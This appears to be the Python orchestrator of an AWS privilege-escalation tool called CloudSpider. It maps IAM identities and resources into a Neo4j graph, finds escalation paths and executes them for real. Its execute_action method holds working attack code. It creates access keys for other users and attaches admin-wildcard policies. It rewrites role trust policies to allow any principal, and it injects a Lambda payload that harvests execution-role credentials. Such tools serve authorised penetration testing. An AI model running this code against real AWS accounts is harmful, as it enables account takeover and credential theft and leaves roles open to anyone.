import os
import json
import time
import base64
import logging
import boto3
from typing import Dict, Any, Optional, List
from enum import Enum
from cryptography.fernet import Fernet, InvalidToken
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

from src.discovery.extractor import Extractor
from src.graph.builder import GraphBuilder
from src.pathfinder.analyst import PathfinderAnalyst

logger = logging.getLogger(__name__)


class PipelineStage(str, Enum):
    IDLE = "idle"
    DISCOVERING = "discovering"
    DISCOVERED = "discovered"
    BUILDING = "building"
    GRAPH_BUILT = "graph_built"
    ERROR = "error"


class Orchestrator:
    """
    Central controller that manages credentials, drives the CloudSpider
    pipeline, and provides graph data for the frontend.
    """

    def __init__(self, neo4j_uri: str = None):
        self.neo4j_uri = neo4j_uri or os.environ.get("NEO4J_URI", "bolt://localhost:7687")
        self.snapshot_dir = os.environ.get("SNAPSHOT_DIR", "/app/snapshots")
        os.makedirs(self.snapshot_dir, exist_ok=True)

        # Credential store: {profile_name: {access_key_id, secret_access_key, session_token, region}}
        self._credentials: Dict[str, Dict[str, str]] = {}
        self._active_profile: Optional[str] = None

        # Pipeline state
        self.stage = PipelineStage.IDLE
        self._identities = []
        self._resources = []

        # Graph builder (persistent connection)
        self._builder: Optional[GraphBuilder] = None

    # ── Credential Management ──────────────────────────────────────────

    def add_credential(self, name: str, access_key_id: str, secret_access_key: str,
                       session_token: str = "", region: str = "us-east-1"):
        self._credentials[name] = {
            "access_key_id": access_key_id,
            "secret_access_key": secret_access_key,
            "session_token": session_token,
            "region": region,
            "identity": None,  # populated on activation
        }
        logger.info(f"Credential profile '{name}' added.")

    def remove_credential(self, name: str):
        if name in self._credentials:
            del self._credentials[name]
            if self._active_profile == name:
                self._active_profile = None
            logger.info(f"Credential profile '{name}' removed.")

    def activate_credential(self, name: str) -> Dict[str, str]:
        """Activate a profile and test it. Returns caller identity info."""
        if name not in self._credentials:
            raise ValueError(f"Profile '{name}' not found.")
        cred = self._credentials[name]
        try:
            session = boto3.Session(
                aws_access_key_id=cred["access_key_id"],
                aws_secret_access_key=cred["secret_access_key"],
                aws_session_token=cred["session_token"] or None,
                region_name=cred["region"],
            )
            sts = session.client("sts")
            identity = sts.get_caller_identity()
            self._active_profile = name
            identity_info = {
                "arn": identity["Arn"],
                "account": identity["Account"],
                "user_id": identity["UserId"],
            }
            # Persist identity info on the credential for display
            self._credentials[name]["identity"] = identity_info
            logger.info(f"Profile '{name}' activated. Caller: {identity['Arn']}")
            return identity_info
        except Exception as e:
            logger.error(f"Failed to activate profile '{name}': {e}")
            raise

    def list_credentials(self) -> List[Dict[str, Any]]:
        """Returns profile list with names, regions, and identity info (never secrets)."""
        result = []
        for name, cred in self._credentials.items():
            entry = {
                "name": name,
                "region": cred["region"],
                "is_active": name == self._active_profile,
            }
            if cred.get("identity"):
                entry["identity"] = cred["identity"]
            result.append(entry)
        return result

    def get_active_profile(self) -> Optional[Dict[str, Any]]:
        if not self._active_profile:
            return None
        cred = self._credentials[self._active_profile]
        return {"name": self._active_profile, "region": cred["region"]}

    def _get_active_session(self) -> boto3.Session:
        if not self._active_profile:
            raise ValueError("No active credential profile. Activate one first.")
        cred = self._credentials[self._active_profile]
        return boto3.Session(
            aws_access_key_id=cred["access_key_id"],
            aws_secret_access_key=cred["secret_access_key"],
            aws_session_token=cred["session_token"] or None,
            region_name=cred["region"],
        )

    # ── Pipeline Operations ────────────────────────────────────────────

    def _ensure_builder(self):
        """Ensure the GraphBuilder is connected to Neo4j."""
        if not self._builder or not self._builder.driver:
            self._builder = GraphBuilder(uri=self.neo4j_uri)
            self._builder.connect()

    def run_discovery(self) -> Dict[str, Any]:
        """Run the Discovery Engine to extract identities and resources."""
        self.stage = PipelineStage.DISCOVERING
        try:
            session = self._get_active_session()
            extractor = Extractor(region_name=session.region_name)
            # Inject the session directly so we use the active credentials
            extractor.session = session
            extractor.iam_client = session.client("iam")

            logger.info("Starting identity extraction...")
            self._identities = extractor.extract_identities()
            logger.info(f"Extracted {len(self._identities)} identities.")

            logger.info("Starting resource extraction...")
            self._resources = extractor.extract_resources()
            logger.info(f"Extracted {len(self._resources)} resources.")

            self.stage = PipelineStage.DISCOVERED
            return {
                "identities": len(self._identities),
                "resources": len(self._resources),
                "identity_names": [i.name for i in self._identities],
                "resource_names": [r.name for r in self._resources],
            }
        except Exception as e:
            self.stage = PipelineStage.ERROR
            logger.error(f"Discovery failed: {e}")
            raise

    def build_graph(self, mode: str = "build") -> Dict[str, Any]:
        """Build the Neo4j graph from discovered data."""
        if not self._identities and not self._resources:
            raise ValueError("No data to build graph from. Run discovery first.")

        self.stage = PipelineStage.BUILDING
        try:
            self._ensure_builder()

            if mode == "build":
                logger.info("Clearing existing graph (build mode)...")
                self._builder.clear_graph()

            logger.info("Adding nodes to graph...")
            for identity in self._identities:
                self._builder.add_node(identity)
            for resource in self._resources:
                self._builder.add_node(resource)
            logger.info(f"Added {len(self._identities) + len(self._resources)} nodes.")

            logger.info("Evaluating permissions and building edges...")
            self._builder.build_edges(self._identities, self._resources)
            logger.info("Edge construction complete.")

            self.stage = PipelineStage.GRAPH_BUILT
            stats = self._get_graph_stats()
            return stats
        except Exception as e:
            self.stage = PipelineStage.ERROR
            logger.error(f"Graph build failed: {e}")
            raise

    def run_full_pipeline(self, mode: str = "build") -> Dict[str, Any]:
        """Run discovery + graph build in one go."""
        discovery_result = self.run_discovery()
        build_result = self.build_graph(mode)
        return {"discovery": discovery_result, "build": build_result}

    # ── Graph Data ─────────────────────────────────────────────────────

    def _get_graph_stats(self) -> Dict[str, int]:
        self._ensure_builder()
        with self._builder.driver.session() as session:
            node_count = session.run("MATCH (n) RETURN count(n) as c").single()["c"]
            edge_count = session.run("MATCH ()-[r]->() RETURN count(r) as c").single()["c"]
        return {"nodes": node_count, "edges": edge_count}

    def get_graph_data(self) -> Dict[str, Any]:
        """Fetch all nodes and edges from Neo4j formatted for D3.js."""
        self._ensure_builder()
        nodes = []
        links = []
        node_ids = set()

        with self._builder.driver.session() as session:
            # Fetch all nodes
            result = session.run("MATCH (n) RETURN n, labels(n) as labels")
            for record in result:
                node = record["n"]
                labels = record["labels"]
                arn = node.get("arn", "")
                node_ids.add(arn)
                nodes.append({
                    "id": arn,
                    "name": node.get("name", arn),
                    "type": labels[0] if labels else "UNKNOWN",
                })

            # Fetch all relationships
            result = session.run("MATCH (a)-[r]->(b) RETURN a.arn as source, b.arn as target, type(r) as rel_type")
            for record in result:
                links.append({
                    "source": record["source"],
                    "target": record["target"],
                    "type": record["rel_type"],
                })

        return {"nodes": nodes, "links": links}

    # ── Pathfinder ─────────────────────────────────────────────────────

    def find_paths(self, start_arn: str, target_arn: str) -> List[List[Dict[str, str]]]:
        """Find privilege escalation paths from start_arn to target_arn.

        Uses the same graph data that the GUI visualizes — BFS in Python
        over the nodes/links fetched from Neo4j.  If an edge is visible
        on screen, this will find it.
        """
        graph_data = self.get_graph_data()
        analyst = PathfinderAnalyst(graph_data)
        paths = analyst.find_shortest_paths(start_arn, target_arn)
        logger.info(f"Found {len(paths)} escalation path(s).")
        return paths

    # ── Action Execution ───────────────────────────────────────────────

    def execute_action(self, edge_type: str, source_arn: str, target_arn: str) -> Dict[str, Any]:
        """Execute a real AWS API call corresponding to a graph edge."""
        session = self._get_active_session()
        logger.warning(f"EXECUTING ACTION: {edge_type} from {source_arn} -> {target_arn}")

        try:
            if edge_type == "ASSUME_ROLE":
                sts = session.client("sts")
                resp = sts.assume_role(
                    RoleArn=target_arn,
                    RoleSessionName="CloudSpider-AssumeRole",
                )
                return {
                    "success": True,
                    "action": "sts:AssumeRole",
                    "result": {
                        "access_key_id": resp["Credentials"]["AccessKeyId"],
                        "secret_access_key": resp["Credentials"]["SecretAccessKey"],
                        "session_token": resp["Credentials"]["SessionToken"],
                        "expiration": str(resp["Credentials"]["Expiration"]),
                    },
                }

            elif edge_type == "PASS_ROLE":
                # PassRole is an authorization check, not a standalone API call.
                # We verify it by simulating the permission check.
                return {
                    "success": True,
                    "action": "iam:PassRole",
                    "result": {
                        "message": f"PassRole permission for {target_arn} is authorized via policy evaluation. "
                                   f"PassRole is exercised implicitly when calling services like Lambda or EC2.",
                    },
                }

            elif edge_type == "CreateAccessKey":
                iam = session.client("iam")
                # Extract username from ARN: arn:aws:iam::ACCOUNT:user/USERNAME
                username = target_arn.split("/")[-1]
                resp = iam.create_access_key(UserName=username)
                key = resp["AccessKey"]
                return {
                    "success": True,
                    "action": "iam:CreateAccessKey",
                    "result": {
                        "access_key_id": key["AccessKeyId"],
                        "secret_access_key": key["SecretAccessKey"],
                        "username": key["UserName"],
                    },
                }

            elif edge_type == "AdministerResource":
                # Determine action based on target type
                if ":user/" in target_arn:
                    iam = session.client("iam")
                    username = target_arn.split("/")[-1]
                    iam.put_user_policy(
                        UserName=username,
                        PolicyName="CloudSpider-Escalation-Test",
                        PolicyDocument=json.dumps({
                            "Version": "2012-10-17",
                            "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
                        }),
                    )
                    return {
                        "success": True,
                        "action": "iam:PutUserPolicy",
                        "result": {"message": f"Admin policy attached to user {username}."},
                    }
                elif ":role/" in target_arn:
                    iam = session.client("iam")
                    role_name = target_arn.split("/")[-1]
                    iam.update_assume_role_policy(
                        RoleName=role_name,
                        PolicyDocument=json.dumps({
                            "Version": "2012-10-17",
                            "Statement": [{
                                "Effect": "Allow",
                                "Principal": {"AWS": "*"},
                                "Action": "sts:AssumeRole",
                            }]
                        }),
                    )
                    return {
                        "success": True,
                        "action": "iam:UpdateAssumeRolePolicy",
                        "result": {"message": f"Trust policy updated for role {role_name}."},
                    }
                else:
                    return {"success": False, "error": f"Cannot determine admin action for target: {target_arn}"}

            elif edge_type == "CanUpdateFunction":
                lam = session.client("lambda")
                func_name = target_arn.split(":")[-1]
                logger.info(f"CanUpdateFunction: deploying credential-extraction payload to {func_name}...")

                import io
                import zipfile

                # 1. Get the Lambda's execution role ARN (for logging)
                func_config = lam.get_function(FunctionName=func_name)
                exec_role_arn = func_config["Configuration"]["Role"]
                original_handler = func_config["Configuration"]["Handler"]
                original_runtime = func_config["Configuration"]["Runtime"]
                logger.info(f"  Target execution role: {exec_role_arn}")

                # 2. Backup: download the current deployment package
                original_code_url = func_config["Code"]["Location"]
                import urllib.request
                original_zip_bytes = urllib.request.urlopen(original_code_url).read()
                logger.info(f"  Original code backed up ({len(original_zip_bytes)} bytes)")

                # 3. Build credential-extraction payload
                payload_code = (
                    "import json, boto3\n"
                    "def handler(event, context):\n"
                    "    sts = boto3.client('sts')\n"
                    "    identity = sts.get_caller_identity()\n"
                    "    # Get the role session credentials from the Lambda environment\n"
                    "    import os\n"
                    "    return {\n"
                    "        'statusCode': 200,\n"
                    "        'body': json.dumps({\n"
                    "            'arn': identity['Arn'],\n"
                    "            'access_key_id': os.environ.get('AWS_ACCESS_KEY_ID', ''),\n"
                    "            'secret_access_key': os.environ.get('AWS_SECRET_ACCESS_KEY', ''),\n"
                    "            'session_token': os.environ.get('AWS_SESSION_TOKEN', ''),\n"
                    "        })\n"
                    "    }\n"
                )
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                    zf.writestr("index.py", payload_code)
                zip_bytes = zip_buffer.getvalue()

                # 4. Deploy the payload
                lam.update_function_code(
                    FunctionName=func_name,
                    ZipFile=zip_bytes,
                )
                logger.info(f"  Code uploaded to {func_name}, waiting for code update to complete...")

                # Wait for code update to complete before updating configuration
                import time as _time
                for _attempt in range(15):
                    _time.sleep(2)
                    _fn = lam.get_function(FunctionName=func_name)
                    state = _fn["Configuration"].get("State", "Active")
                    update_status = _fn["Configuration"].get("LastUpdateStatus", "Successful")
                    if state == "Active" and update_status == "Successful":
                        break
                    logger.info(f"  Waiting for code update... (state={state}, update={update_status})")

                # Update handler to point to our payload
                lam.update_function_configuration(
                    FunctionName=func_name,
                    Handler="index.handler",
                    Runtime="python3.12",
                )
                logger.info(f"  Handler updated, waiting for configuration update to propagate...")

                # 5. Wait for the function to become active
                for _attempt in range(15):
                    _time.sleep(2)
                    _fn = lam.get_function(FunctionName=func_name)
                    state = _fn["Configuration"].get("State", "Active")
                    update_status = _fn["Configuration"].get("LastUpdateStatus", "Successful")
                    if state == "Active" and update_status == "Successful":
                        break
                    logger.info(f"  Waiting for config update... (state={state}, update={update_status})")

                # 6. Invoke the Lambda to extract credentials
                logger.info(f"  Invoking {func_name} to extract execution role credentials...")
                invoke_resp = lam.invoke(
                    FunctionName=func_name,
                    InvocationType="RequestResponse",
                    Payload=json.dumps({}),
                )
                resp_payload = json.loads(invoke_resp["Payload"].read())
                logger.info(f"  Lambda response status: {resp_payload.get('statusCode')}")

                # Parse the credentials from the response
                body = json.loads(resp_payload.get("body", "{}"))
                harvested_key = body.get("access_key_id", "")
                harvested_secret = body.get("secret_access_key", "")
                harvested_token = body.get("session_token", "")
                harvested_arn = body.get("arn", "")

                # 7. Restore the original code
                logger.info(f"  Restoring original code for {func_name}...")
                lam.update_function_code(
                    FunctionName=func_name,
                    ZipFile=original_zip_bytes,
                )
                # Restore original handler and runtime
                for _attempt in range(10):
                    _time.sleep(2)
                    _fn = lam.get_function(FunctionName=func_name)
                    if _fn["Configuration"].get("State") == "Active" and _fn["Configuration"].get("LastUpdateStatus") == "Successful":
                        break
                lam.update_function_configuration(
                    FunctionName=func_name,
                    Handler=original_handler,
                    Runtime=original_runtime,
                )
                logger.info(f"  Original code restored for {func_name}.")

                if harvested_key and harvested_secret:
                    return {
                        "success": True,
                        "action": "lambda:UpdateFunctionCode+Invoke",
                        "result": {
                            "message": f"Successfully injected payload into {func_name}, invoked it, "
                                       f"and harvested execution role credentials for {exec_role_arn}. "
                                       f"Original code has been restored.",
                            "function_arn": target_arn,
                            "execution_role_arn": exec_role_arn,
                            "assumed_identity": harvested_arn,
                            "access_key_id": harvested_key,
                            "secret_access_key": harvested_secret,
                            "session_token": harvested_token,
                        },
                    }
                else:
                    return {
                        "success": True,
                        "action": "lambda:UpdateFunctionCode+Invoke",
                        "result": {
                            "message": f"Payload deployed and invoked on {func_name}, but could not "
                                       f"extract credentials from the response. The Lambda's execution "
                                       f"role is {exec_role_arn}. Original code has been restored.",
                            "function_arn": target_arn,
                            "execution_role_arn": exec_role_arn,
                            "raw_response": resp_payload,
                        },
                    }

            elif edge_type == "CanRunInstance":
                return {
                    "success": True,
                    "action": "ec2:RunInstances",
                    "result": {
                        "message": f"ec2:RunInstances is authorized for the target. "
                                   f"Actual instance launch requires AMI, subnet, and instance type parameters.",
                        "target": target_arn,
                    },
                }

            elif edge_type == "USES_ROLE":
                # USES_ROLE is a structural relationship: a Lambda function executes
                # under this IAM role.  There is no API to "execute" — the edge
                # tells the attacker that injecting code into the Lambda (via
                # UpdateFunctionCode) will run with the target role's permissions.
                lambda_name = source_arn.split(":")[-1] if ":function:" in source_arn else source_arn
                role_name = target_arn.split("/")[-1] if "/" in target_arn else target_arn
                return {
                    "success": True,
                    "action": "info:UsesRole",
                    "result": {
                        "message": f"Lambda function '{lambda_name}' executes as role '{role_name}'. "
                                   f"Any code deployed to this function will run with that role's permissions. "
                                   f"This is a structural relationship — no API call is needed.",
                        "lambda_arn": source_arn,
                        "execution_role_arn": target_arn,
                    },
                }

            elif edge_type == "MEMBER_OF":
                # MEMBER_OF is a structural relationship: the user belongs to
                # an IAM group and inherits its policies.
                username = source_arn.split("/")[-1] if "/" in source_arn else source_arn
                group_name = target_arn.split("/")[-1] if "/" in target_arn else target_arn
                return {
                    "success": True,
                    "action": "info:MemberOf",
                    "result": {
                        "message": f"User '{username}' is a member of group '{group_name}' and inherits "
                                   f"all of the group's IAM policies. This is a structural relationship — "
                                   f"no API call is needed.",
                        "user_arn": source_arn,
                        "group_arn": target_arn,
                    },
                }

            elif edge_type == "HAS_ACCESS":
                # HAS_ACCESS means the identity can read/write the target resource.
                # We verify with a lightweight probe depending on resource type.
                if target_arn.startswith("arn:aws:s3"):
                    bucket_name = target_arn.split(":::")[-1] if ":::" in target_arn else target_arn
                    try:
                        s3 = session.client("s3")
                        s3.list_objects_v2(Bucket=bucket_name, MaxKeys=1)
                        return {
                            "success": True,
                            "action": "s3:ListObjectsV2",
                            "result": {
                                "message": f"Successfully listed objects in S3 bucket '{bucket_name}'. "
                                           f"Access confirmed.",
                                "bucket": bucket_name,
                            },
                        }
                    except Exception as s3_err:
                        return {
                            "success": True,
                            "action": "s3:HAS_ACCESS",
                            "result": {
                                "message": f"S3 access to '{bucket_name}' is authorized per policy evaluation, "
                                           f"but the probe call returned: {s3_err}. "
                                           f"This may be due to bucket conditions or the current session identity.",
                                "bucket": bucket_name,
                            },
                        }
                elif ":rds:" in target_arn:
                    db_id = target_arn.split(":")[-1] if ":" in target_arn else target_arn
                    try:
                        rds = session.client("rds")
                        resp = rds.describe_db_instances(DBInstanceIdentifier=db_id)
                        db = resp["DBInstances"][0]
                        return {
                            "success": True,
                            "action": "rds:DescribeDBInstances",
                            "result": {
                                "message": f"Successfully described RDS instance '{db_id}'. Access confirmed.",
                                "endpoint": db.get("Endpoint", {}).get("Address", "N/A"),
                                "engine": db.get("Engine", "N/A"),
                                "status": db.get("DBInstanceStatus", "N/A"),
                            },
                        }
                    except Exception as rds_err:
                        return {
                            "success": True,
                            "action": "rds:HAS_ACCESS",
                            "result": {
                                "message": f"RDS access to '{db_id}' is authorized per policy evaluation, "
                                           f"but the probe call returned: {rds_err}.",
                                "db_identifier": db_id,
                            },
                        }
                else:
                    return {
                        "success": True,
                        "action": "info:HasAccess",
                        "result": {
                            "message": f"Access to resource '{target_arn}' is authorized per policy evaluation.",
                            "resource_arn": target_arn,
                        },
                    }

            else:
                return {"success": False, "error": f"Unknown edge type: {edge_type}"}

        except Exception as e:
            logger.error(f"Action execution failed: {e}")
            return {"success": False, "error": str(e)}

    # ── Graph Snapshots (AES-encrypted) ─────────────────────────────────

    @staticmethod
    def _derive_key(password: str, salt: bytes) -> bytes:
        """Derive a Fernet-compatible key from a password using PBKDF2."""
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=480_000)
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))

    def save_graph(self, name: str, password: str,
                   client_state: Dict[str, Any] = None) -> Dict[str, Any]:
        """Export current Neo4j graph + full session state to an encrypted snapshot."""
        self._ensure_builder()
        graph = self.get_graph_data()

        # Build the full state payload
        cs = client_state or {}
        payload = {
            "nodes": graph["nodes"],
            "links": graph["links"],
            "compromised_nodes": cs.get("compromisedNodes", []),
            "edge_status": cs.get("edgeStatus", {}),
            "edge_manual_offset": cs.get("edgeManualOffset", {}),
            "initial_compromised_arn": cs.get("initialCompromisedArn", None),
            "visible_node_ids": cs.get("visibleNodeIds", []),
            "visible_edge_types": cs.get("visibleEdgeTypes", []),
            "known_node_ids": cs.get("knownNodeIds", []),
            "known_edge_types": cs.get("knownEdgeTypes", []),
            "filter_initialized": cs.get("filterInitialized", False),
            "node_positions": cs.get("nodePositions", {}),
            "credentials": {
                name: {
                    "access_key_id": c["access_key_id"],
                    "secret_access_key": c["secret_access_key"],
                    "session_token": c["session_token"],
                    "region": c["region"],
                    "identity": c.get("identity"),
                } for name, c in self._credentials.items()
            },
            "active_profile": self._active_profile,
        }

        # Metadata header (unencrypted, for listing)
        metadata = {
            "name": name,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "profile": self._active_profile,
            "node_count": len(graph["nodes"]),
            "link_count": len(graph["links"]),
        }

        # Encrypt payload
        salt = os.urandom(16)
        key = self._derive_key(password, salt)
        fernet = Fernet(key)
        encrypted = fernet.encrypt(json.dumps(payload).encode())

        envelope = {
            "metadata": metadata,
            "salt": base64.b64encode(salt).decode(),
            "encrypted": encrypted.decode(),
        }

        filepath = os.path.join(self.snapshot_dir, f"{name}.json")
        with open(filepath, "w") as f:
            json.dump(envelope, f)
        logger.info(f"Encrypted snapshot saved: {filepath}")
        return {"name": name, "nodes": len(graph["nodes"]), "links": len(graph["links"])}

    def load_graph(self, name: str, password: str, mode: str = "build") -> Dict[str, Any]:
        """Load an encrypted snapshot, restore graph into Neo4j and return full state."""
        filepath = os.path.join(self.snapshot_dir, f"{name}.json")
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"Snapshot '{name}' not found.")

        with open(filepath, "r") as f:
            envelope = json.load(f)

        # Decrypt
        salt = base64.b64decode(envelope["salt"])
        key = self._derive_key(password, salt)
        fernet = Fernet(key)
        try:
            decrypted = fernet.decrypt(envelope["encrypted"].encode())
        except InvalidToken:
            raise ValueError("Incorrect password.")

        data = json.loads(decrypted)

        # Restore graph into Neo4j
        self._ensure_builder()
        if mode == "build":
            self._builder.clear_graph()

        with self._builder.driver.session() as session:
            for node in data.get("nodes", []):
                label = node.get("type", "UNKNOWN")
                session.run(
                    f"MERGE (n:{label} {{arn: $arn}}) SET n.name = $name",
                    arn=node["id"], name=node["name"],
                )
            for link in data.get("links", []):
                rel_type = link.get("type", "CONNECTED")
                session.run(
                    f"MATCH (a {{arn: $src}}), (b {{arn: $tgt}}) MERGE (a)-[:{rel_type}]->(b)",
                    src=link["source"], tgt=link["target"],
                )

        # Restore credentials into this session's orchestrator
        stored_creds = data.get("credentials", {})
        for cname, cdata in stored_creds.items():
            self._credentials[cname] = cdata
        if data.get("active_profile") and data["active_profile"] in self._credentials:
            self._active_profile = data["active_profile"]

        logger.info(f"Encrypted snapshot '{name}' loaded ({mode} mode).")

        # Return full state for frontend restoration
        return {
            **self._get_graph_stats(),
            "state": {
                "compromisedNodes": data.get("compromised_nodes", []),
                "edgeStatus": data.get("edge_status", {}),
                "edgeManualOffset": data.get("edge_manual_offset", {}),
                "initialCompromisedArn": data.get("initial_compromised_arn"),
                "visibleNodeIds": data.get("visible_node_ids", []),
                "visibleEdgeTypes": data.get("visible_edge_types", []),
                "knownNodeIds": data.get("known_node_ids", []),
                "knownEdgeTypes": data.get("known_edge_types", []),
                "filterInitialized": data.get("filter_initialized", False),
                "nodePositions": data.get("node_positions", {}),
                "activeProfile": data.get("active_profile"),
            },
        }

    def list_snapshots(self) -> List[Dict[str, Any]]:
        """List all saved graph snapshots (reads only unencrypted metadata)."""
        snapshots = []
        for filename in os.listdir(self.snapshot_dir):
            if filename.endswith(".json"):
                filepath = os.path.join(self.snapshot_dir, filename)
                try:
                    with open(filepath, "r") as f:
                        data = json.load(f)
                    meta = data.get("metadata", {})
                    snapshots.append({
                        "name": meta.get("name", filename.replace(".json", "")),
                        "timestamp": meta.get("timestamp", ""),
                        "profile": meta.get("profile", ""),
                        "nodes": meta.get("node_count", 0),
                        "links": meta.get("link_count", 0),
                    })
                except Exception:
                    snapshots.append({"name": filename.replace(".json", ""), "error": "corrupt"})
        # Sort snapshots by timestamp descending (most recent first)
        snapshots.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
        return snapshots

    def delete_snapshot(self, name: str):
        filepath = os.path.join(self.snapshot_dir, f"{name}.json")
        if os.path.exists(filepath):
            os.remove(filepath)
            logger.info(f"Snapshot '{name}' deleted.")
        else:
            raise FileNotFoundError(f"Snapshot '{name}' not found.")
